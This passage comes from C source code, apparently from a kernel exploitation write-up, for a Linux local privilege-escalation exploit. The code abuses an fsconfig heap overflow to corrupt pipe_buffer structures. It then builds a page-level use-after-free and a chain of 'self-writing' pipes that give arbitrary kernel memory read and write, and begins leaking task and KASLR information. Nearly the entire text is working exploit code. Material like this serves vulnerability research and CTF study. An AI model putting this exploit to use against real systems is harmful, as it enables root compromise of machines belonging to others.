pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (PIPE_SPRAY_NR - <span class="hljs-number">1</span>); i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (read_msg(msqid[i], buf, MSG_SZ, MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at reading %d msg_queue.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to release msg_msg!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">64</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at extending %d pipe_buffer.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to extend pipe_buffer!&quot;</span>);<br>        &#125;<br><br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);  <span class="hljs-comment">/* prevent pipe_release() */</span><br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Overwriting pipe_buffer-&gt;page...&quot;</span>);<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;ar&quot;</span>, <span class="hljs-string">&quot;tt&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ((<span class="hljs-number">0x1000</span> - <span class="hljs-number">8</span> * <span class="hljs-number">4</span>) / <span class="hljs-number">16</span>); i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;ratbant&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking for pipe&#x27;s corruption...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (PIPE_SPRAY_NR - <span class="hljs-number">1</span>); i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-type">char</span> a3_str[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">int</span> nr;<br><br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">memset</span>(a3_str, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(a3_str));<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], a3_str, <span class="hljs-number">8</span>);<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(a3_str, <span class="hljs-string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i) &#123;<br>            orig_pid = i;<br>            victim_pid = nr;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully corrupt pipe_buffer! &quot;</span><br>           <span class="hljs-string">&quot;orig_pid: \033[0m%d, \033[32m\033[1mvictim pipe: \033[0m%d\n&quot;</span>,<br>           orig_pid, victim_pid);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">corrupting_second_level_pipe_for_pipe_uaf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>], pipe_buf[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">size_t</span> snd_pipe_sz = <span class="hljs-number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m&quot;</span><br>         <span class="hljs-string">&quot;Stage III - corrupting second-level pipe_buffer to exploit a &quot;</span><br>         <span class="hljs-string">&quot;page-level UAF&quot;</span><br>         <span class="hljs-string">&quot;\033[0m\n&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-comment">/* let the page&#x27;s ptr at pipe_buffer */</span><br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="hljs-number">2</span> - <span class="hljs-number">24</span> - <span class="hljs-number">3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-comment">/* free orignal pipe&#x27;s page */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free original pipe...&quot;</span>);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">/* try to rehit victim page by reallocating pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* read victim page to check whether we&#x27;ve successfully hit it */</span><br>    <span class="hljs-built_in">memset</span>(pipe_buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(pipe_buf));<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="hljs-number">8</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], pipe_buf, <span class="hljs-number">40</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">40</span> / <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %lx\n&quot;</span>, i, pipe_buf[i]);<br>    &#125;<br><br>    <span class="hljs-comment">/* I don&#x27;t know why but sometimes the read will be strange :( */</span><br>    <span class="hljs-keyword">if</span> (pipe_buf[<span class="hljs-number">4</span>] == <span class="hljs-number">0xffffffff</span>) &#123;<br>        <span class="hljs-built_in">memcpy</span>(&amp;info_pipe_buf, &amp;((<span class="hljs-type">char</span>*)pipe_buf)[<span class="hljs-number">12</span>], <span class="hljs-number">40</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">memcpy</span>(&amp;info_pipe_buf, pipe_buf, <span class="hljs-number">40</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> <br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;offset: \033[0m%x\n&quot;</span><br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;len: \033[0m%x\n&quot;</span><br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span><br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;flags: \033[0m%x\n&quot;</span><br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;private: \033[0m%lx\n&quot;</span>, <br>           info_pipe_buf.page, <br>           info_pipe_buf.offset, <br>           info_pipe_buf.len, <br>           info_pipe_buf.ops, <br>           info_pipe_buf.flags,<br>           info_pipe_buf.private);<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">size_t</span>) info_pipe_buf.page &lt; <span class="hljs-number">0xffff000000000000</span><br>        || (<span class="hljs-type">size_t</span>) info_pipe_buf.ops &lt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to re-hit victim page!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br><br>    <span class="hljs-comment">/* construct a second-level page uaf */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);<br>    <span class="hljs-comment">//info_pipe_buf.offset = 8;</span><br>    <span class="hljs-comment">//info_pipe_buf.len = 0xf00;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">35</span>; i++) &#123;<br>        write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br>        write(pipe_fd[victim_pid][<span class="hljs-number">1</span>],buf,SND_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-type">char</span> tmp_bf[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">int</span> nr;<br><br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(nr));<br>        <span class="hljs-keyword">if</span> (nr == <span class="hljs-number">0x74747261</span>) &#123;<br>            read(pipe_fd[i][<span class="hljs-number">0</span>], tmp_bf, <span class="hljs-number">4</span>);<br>            read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(nr));<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] nr for %d pipe is %d\n&quot;</span>, i, nr);<br>        <span class="hljs-keyword">if</span> (nr &lt; PIPE_SPRAY_NR &amp;&amp; i != nr) &#123;<br>            snd_orig_pid = nr;<br>            snd_vicitm_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, <br>                   snd_vicitm_pid, snd_orig_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (snd_vicitm_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * VI - SECONDARY exploit stage: build pipe for arbitrary read &amp; write</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">building_self_writing_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> trd_pipe_sz = <span class="hljs-number">0x1000</span> * (TRD_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_pipe_buf</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page_ptr</span>;</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m&quot;</span><br>         <span class="hljs-string">&quot;Stage IV - Building a self-writing pipe system&quot;</span><br>         <span class="hljs-string">&quot;\033[0m\n&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-comment">/* let the page&#x27;s ptr at pipe_buffer */</span><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="hljs-number">24</span> <span class="hljs-number">-3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-comment">/* free orignal pipe&#x27;s page */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free second-level original pipe...&quot;</span>);<br>    close(pipe_fd[snd_orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[snd_orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">/* try to rehit victim page by reallocating pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* let a pipe-&gt;bufs pointing to itself */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.page = info_pipe_buf.page;<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.ops = info_pipe_buf.ops;<br>    evil_pipe_buf.flags = info_pipe_buf.flags;<br>    evil_pipe_buf.private = info_pipe_buf.private;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_2nd_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>, <br>                    self_2nd_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_2nd_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite the 3rd pipe_buffer to this page too */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid<br>            || i == self_2nd_pipe_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_3rd_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                    <span class="hljs-string">&quot;%d\n&quot;</span>, self_3rd_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_3rd_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite the 4th pipe_buffer to this page too */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid<br>            || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_4th_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                    <span class="hljs-string">&quot;%d\n&quot;</span>, self_4th_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_4th_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_2nd_buf</span>, <span class="hljs-title">evil_3rd_buf</span>, <span class="hljs-title">evil_4th_buf</span>;</span><br><span class="hljs-type">char</span> temp_zero_buf[<span class="hljs-number">0x1000</span>]= &#123; <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief Setting up 3 pipes for arbitrary read &amp; write.</span><br><span class="hljs-comment"> * We need to build a circle there for continuously memory seeking:</span><br><span class="hljs-comment"> * - 2nd pipe to search</span><br><span class="hljs-comment"> * - 3rd pipe to change 4th pipe</span><br><span class="hljs-comment"> * - 4th pipe to change 2nd and 3rd pipe</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">setup_evil_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* init the initial val for 2nd,3rd and 4th pipe, for recovering only */</span><br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0xff0</span>;<br><br>    <span class="hljs-comment">/* hijack the 3rd pipe pointing to 4th */</span><br>    evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="hljs-number">3</span>;<br>    evil_3rd_buf.len = <span class="hljs-number">0</span>;<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    evil_4th_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_4th_buf.len = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_read, <span class="hljs-type">void</span> *dst)</span><br>&#123;<br>    <span class="hljs-comment">/* page to read */</span><br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0xfff</span>;<br>    evil_2nd_buf.page = page_to_read;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* read out data */</span><br>    read(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">0</span>], dst, <span class="hljs-number">0xff0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_write, <span class="hljs-type">void</span> *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    <span class="hljs-comment">/* page to write */</span><br>    evil_2nd_buf.page = page_to_write;<br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* write data into dst page */</span><br>    write(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>], src, len);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * VII - FINAL exploit stage with arbitrary read &amp; write</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">size_t</span> *tsk_buf, current_task_page, current_task, parent_task, buf[<span class="hljs-number">0x8000</span>];<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_leaking_by_arbitrary_pipe</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">size_t</span> *comm_addr;<br>    <span class="hljs-type">int</span> try_times;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m&quot;</span><br>         <span class="hljs-string">&quot;Stage V - Leaking info by arbitrary read &amp; write&quot;</span><br>         <span class="hljs-string">&quot;\033[0m\n&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);<br>    setup_evil_pipe();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * KASLR&#x27;s granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,</span><br><span class="hljs-comment">     * so we can simply get the vmemmap_base like this in a SMALL-MEM env.</span><br><span class="hljs-comment">     * For MEM &gt; 1GB, we can just find the secondary_startup_64 func ptr,</span><br><span class="hljs-comment">     * which is located on physmem_base + 0x9d000, i.e., 